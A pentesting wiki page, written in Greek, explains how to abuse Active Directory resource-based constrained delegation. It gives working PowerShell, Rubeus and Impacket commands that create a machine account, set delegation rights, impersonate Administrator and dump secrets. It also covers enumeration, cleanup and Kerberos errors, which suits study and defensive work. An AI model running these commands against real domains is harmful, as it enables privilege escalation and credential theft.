# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Βασικά του Resource-based Constrained Delegation

Αυτό είναι παρόμοιο με το βασικό [Constrained Delegation](constrained-delegation.md) αλλά **αντί** να δίνει δικαιώματα σε ένα **object** για να **impersonate any user against a machine**. Το Resource-based Constrain Delegation **ρυθμίζει** στο **object ποιος μπορεί να υποδυθεί οποιονδήποτε χρήστη εναντίον του**.

Σε αυτήν την περίπτωση, το περιορισμένο object θα έχει ένα attribute που ονομάζεται _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ με το όνομα του χρήστη που μπορεί να υποδυθεί οποιονδήποτε άλλο χρήστη εναντίον του.

Μια άλλη σημαντική διαφορά σε σχέση με αυτή τη Constrained Delegation και τις άλλες delegations είναι ότι οποιοσδήποτε χρήστης με **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) μπορεί να ορίσει το **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (Στις άλλες μορφές Delegation χρειαζόσασταν domain admin προνόμια).

### Νέες Έννοιες

Στο Constrained Delegation ειπώθηκε ότι το flag **`TrustedToAuthForDelegation`** μέσα στην τιμή _userAccountControl_ του χρήστη είναι απαραίτητο για να εκτελεστεί ένα **S4U2Self.** Αλλά αυτό δεν είναι απολύτως αληθές.\
Η πραγματικότητα είναι ότι ακόμη και χωρίς αυτήν την τιμή, μπορείτε να εκτελέσετε ένα **S4U2Self** εναντίον οποιουδήποτε χρήστη αν είστε μια **service** (έχετε SPN) αλλά, αν **έχετε `TrustedToAuthForDelegation`** το επιστρεφόμενο TGS θα είναι **Forwardable** και αν **δεν έχετε** αυτό το flag το επιστρεφόμενο TGS **δεν θα** είναι **Forwardable**.

Ωστόσο, αν το **TGS** που χρησιμοποιείται στο **S4U2Proxy** **ΔΕΝ είναι Forwardable**, προσπαθώντας να καταχραστείτε μια **basic Constrain Delegation** **δεν θα λειτουργήσει**. Αλλά αν προσπαθείτε να εκμεταλλευτείτε μια **Resource-Based constrain delegation**, θα λειτουργήσει.

### Δομή επίθεσης

> Αν έχετε **write equivalent privileges** πάνω σε ένα **Computer** account μπορείτε να αποκτήσετε **privileged access** σε εκείνη τη μηχανή.

Υποθέστε ότι ο επιτιθέμενος έχει ήδη **write equivalent privileges over the victim computer**.

1. Ο επιτιθέμενος **συμβιβάζει** έναν λογαριασμό που έχει **SPN** ή **δημιουργεί έναν** (“Service A”). Σημειώστε ότι **οποιοσδήποτε** _Admin User_ χωρίς οποιοδήποτε άλλο ειδικό προνόμιο μπορεί να **δημιουργήσει** έως και 10 Computer objects (**_MachineAccountQuota_**) και να τους ορίσει ένα **SPN**. Έτσι ο επιτιθέμενος μπορεί απλώς να δημιουργήσει ένα Computer object και να του ορίσει ένα SPN.
2. Ο επιτιθέμενος **καταχράται τα WRITE προνόμιά του** πάνω στον υπολογιστή θύμα (ServiceB) για να ρυθμίσει **resource-based constrained delegation ώστε να επιτρέψει στο ServiceA να υποδύεται οποιονδήποτε χρήστη** εναντίον αυτού του υπολογιστή θύματος (ServiceB).
3. Ο επιτιθέμενος χρησιμοποιεί το Rubeus για να εκτελέσει μια **πλήρη S4U επίθεση** (S4U2Self και S4U2Proxy) από το Service A προς το Service B για έναν χρήστη **με privileged access στο Service B**.
1. S4U2Self (από τον συμβιβασμένο/δημιουργημένο λογαριασμό με SPN): Αίτηση για ένα **TGS του Administrator προς εμένα** (Not Forwardable).
2. S4U2Proxy: Χρήση του **not Forwardable TGS** του προηγούμενου βήματος για να ζητήσετε ένα **TGS** από τον **Administrator** προς τον **host-θύμα**.
3. Ακόμα και αν χρησιμοποιείτε ένα not Forwardable TGS, καθώς εκμεταλλεύεστε resource-based constrained delegation, θα λειτουργήσει.
4. Ο επιτιθέμενος μπορεί να κάνει **pass-the-ticket** και να **υποδυθεί** τον χρήστη για να αποκτήσει **πρόσβαση στο θύμα ServiceB**.

Για να ελέγξετε το _**MachineAccountQuota**_ του domain μπορείτε να χρησιμοποιήσετε:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Επίθεση

### Δημιουργία αντικειμένου υπολογιστή

Μπορείτε να δημιουργήσετε ένα αντικείμενο υπολογιστή μέσα στο domain χρησιμοποιώντας **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Διαμόρφωση Resource-based Constrained Delegation

**Χρήση του activedirectory PowerShell module**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Χρήση powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Εκτέλεση πλήρους S4U attack (Windows/Rubeus)

Πρώτα απ' όλα, δημιουργήσαμε το νέο Computer object με το password `123456`, οπότε χρειαζόμαστε το hash αυτού του password:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Αυτό θα εκτυπώσει τα RC4 και AES hashes για αυτόν τον λογαριασμό.  
Τώρα, το attack μπορεί να εκτελεστεί:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Μπορείτε να δημιουργήσετε περισσότερα tickets για περισσότερες υπηρεσίες ζητώντας μόνο μία φορά χρησιμοποιώντας το `/altservice` param του Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Σημειώστε ότι οι χρήστες έχουν ένα χαρακτηριστικό που ονομάζεται "**Cannot be delegated**". Αν ένας χρήστης έχει αυτήν την ιδιότητα True, δεν θα μπορείτε να τον μιμηθείτε. Αυτή η ιδιότητα μπορεί να φαίνεται μέσα στο bloodhound.
  
### Εργαλεία Linux: end-to-end RBCD με Impacket (2024+)

Αν λειτουργείτε από Linux, μπορείτε να εκτελέσετε ολόκληρη την αλυσίδα RBCD χρησιμοποιώντας τα επίσημα εργαλεία Impacket:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Σημειώσεις
- Εάν το LDAP signing/LDAPS επιβάλλεται, χρησιμοποιήστε `impacket-rbcd -use-ldaps ...`.
- Προτιμήστε κλειδιά AES· πολλοί σύγχρονοι domains περιορίζουν το RC4. Impacket και Rubeus υποστηρίζουν και οι δύο ροές μόνο με AES.
- Το Impacket μπορεί να ξαναγράψει το `sname` ("AnySPN") για κάποια εργαλεία, αλλά αποκτήστε το σωστό SPN όποτε είναι δυνατόν (π.χ., CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Πρόσβαση

Η τελευταία γραμμή εντολών θα εκτελέσει την **πλήρη S4U επίθεση και θα εγχύσει το TGS** από τον Administrator στον host-θύμα στη **μνήμη**.\
Σε αυτό το παράδειγμα ζητήθηκε ένα TGS για την υπηρεσία **CIFS** από τον Administrator, οπότε θα μπορείτε να προσπελάσετε το **C$**:
```bash
ls \\victim.domain.local\C$
```
### Κατάχρηση διαφορετικών service tickets

Μάθετε για τα [**available service tickets here**](silver-ticket.md#available-services).

## Καταγραφή, έλεγχος και καθαρισμός

### Καταγραφή υπολογιστών με RBCD ρυθμισμένο

PowerShell (αποκωδικοποίηση του SD για την επίλυση των SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (read ή flush με μία εντολή):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Καθαρισμός / επαναφορά RBCD

- PowerShell (εκκαθάριση της ιδιότητας):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Σφάλματα Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Σημαίνει ότι το Kerberos είναι ρυθμισμένο να μην χρησιμοποιεί DES ή RC4 και παρέχετε μόνο το RC4 hash. Δώστε στο Rubeus τουλάχιστον το AES256 hash (ή δώστε του απλά τα rc4, aes128 και aes256 hashes). Example: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Σημαίνει ότι η ώρα του τρέχοντος υπολογιστή διαφέρει από αυτήν του DC και το Kerberos δεν λειτουργεί σωστά.
- **`preauth_failed`**: Σημαίνει ότι το δοσμένο όνομα χρήστη + hashes δεν λειτουργούν για σύνδεση. Μπορεί να ξεχάσατε να βάλετε το "$" μέσα στο όνομα χρήστη όταν δημιουργούσατε τα hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Αυτό μπορεί να σημαίνει:
- Ο χρήστης που προσπαθείτε να μιμηθείτε δεν μπορεί να αποκτήσει πρόσβαση στην επιθυμητή υπηρεσία (επειδή δεν μπορείτε να τον μιμηθείτε ή επειδή δεν έχει επαρκή προνόμια)
- Η ζητούμενη υπηρεσία δεν υπάρχει (αν ζητάτε ticket για winrm αλλά το winrm δεν τρέχει)
- Ο fakecomputer που δημιουργήθηκε έχει χάσει τα προνόμιά του πάνω στον ευάλωτο server και πρέπει να τα επαναδώσετε.
- Κακομεταχειρίζεστε το κλασικό KCD· να θυμάστε ότι το RBCD δουλεύει με non-forwardable S4U2Self tickets, ενώ το KCD απαιτεί forwardable.

## Σημειώσεις, relays και εναλλακτικές

- Μπορείτε επίσης να γράψετε το RBCD SD μέσω AD Web Services (ADWS) αν το LDAP είναι φιλτραρισμένο. See:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Οι Kerberos relay αλυσίδες συχνά τελειώνουν σε RBCD για να επιτύχουν local SYSTEM σε ένα βήμα. Δείτε πρακτικά παραδείγματα end-to-end:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Αν το LDAP signing/channel binding είναι **disabled** και μπορείτε να δημιουργήσετε ένα machine account, εργαλεία όπως το **KrbRelayUp** μπορούν να relay-άρουν ένα υποχρεωμένο Kerberos auth στο LDAP, να θέσουν `msDS-AllowedToActOnBehalfOfOtherIdentity` για το machine account σας στο αντικείμενο του στοχευόμενου υπολογιστή, και να μιμηθούν αμέσως τον **Administrator** μέσω S4U από off-host.

## Αναφορές

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
